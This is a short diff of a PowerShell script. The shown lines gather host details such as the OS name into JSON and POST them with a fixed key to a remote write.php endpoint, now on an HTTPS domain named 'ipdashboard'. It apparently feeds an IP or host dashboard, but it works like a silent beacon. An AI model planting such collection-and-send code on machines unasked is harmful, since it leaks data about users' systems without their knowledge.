@@ -19,7 +19,8 @@ try {
         os = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
     } | ConvertTo-Json -Compress
 
-    Invoke-RestMethod -Uri "http://160.25.7.137/write.php?key=chomolokko" `
+    # Updated to use your new Cloudflare domain and HTTPS
+    Invoke-RestMethod -Uri "https://ipdashboard.mdratul.shop/write.php?key=chomolokko" `
         -Method POST `
         -Body $data `
         -ContentType "application/json" `
